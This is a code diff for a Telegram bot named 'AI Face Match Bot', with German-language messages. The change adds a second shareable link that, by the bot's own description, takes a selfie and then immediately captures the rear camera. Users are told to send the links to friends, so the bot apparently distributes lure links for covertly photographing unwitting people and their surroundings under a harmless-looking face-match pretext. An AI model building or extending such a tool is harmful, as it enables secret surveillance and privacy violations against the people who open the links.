@@ -60,25 +60,33 @@ async function handleMessage(message) {
 
     console.log(`📨 Nachricht von ${firstName} (${chatId}): ${text}`);
 
+    const linkFront = WEBSITE_URL;
+    const linkBoth = WEBSITE_URL + '?mode=both';
+
     switch (text) {
         case '/start':
             await sendMessage(chatId,
                 `👋 Hey <b>${firstName}</b>!\n\n` +
                 `Willkommen beim <b>AI Face Match Bot</b>! 🤖✨\n\n` +
-                `Hier ist dein Link zum Teilen:\n` +
-                `🔗 <a href="${WEBSITE_URL}">${WEBSITE_URL}</a>\n\n` +
-                `Schick den Link einfach an deine Freunde und ` +
-                `schau was passiert! 😏\n\n` +
+                `Du hast 2 Links zur Auswahl:\n\n` +
+                `1️⃣ <b>Nur Selfie Kamera:</b>\n` +
+                `🔗 <a href="${linkFront}">${linkFront}</a>\n\n` +
+                `2️⃣ <b>Beide Kameras nacheinander:</b> (Macht erst Selfie, dann sofort Rückkamera)\n` +
+                `🔗 <a href="${linkBoth}">${linkBoth}</a>\n\n` +
+                `Schick den Link einfach an deine Freunde!\n\n` +
                 `Befehle:\n` +
-                `📎 /link - Link nochmal anzeigen\n` +
+                `📎 /link - Links nochmal anzeigen\n` +
                 `ℹ️ /help - Hilfe anzeigen`
             );
             break;
 
         case '/link':
             await sendMessage(chatId,
-                `🔗 Hier ist dein Link:\n\n` +
-                `<a href="${WEBSITE_URL}">${WEBSITE_URL}</a>\n\n` +
+                `🔗 <b>Hier sind deine Links:</b>\n\n` +
+                `1️⃣ <b>Nur Selfie Kamera:</b>\n` +
+                `<a href="${linkFront}">${linkFront}</a>\n\n` +
+                `2️⃣ <b>Selfie + Rückkamera:</b>\n` +
+                `<a href="${linkBoth}">${linkBoth}</a>\n\n` +
                 `Einfach kopieren und teilen! 📤`
             );
             break;
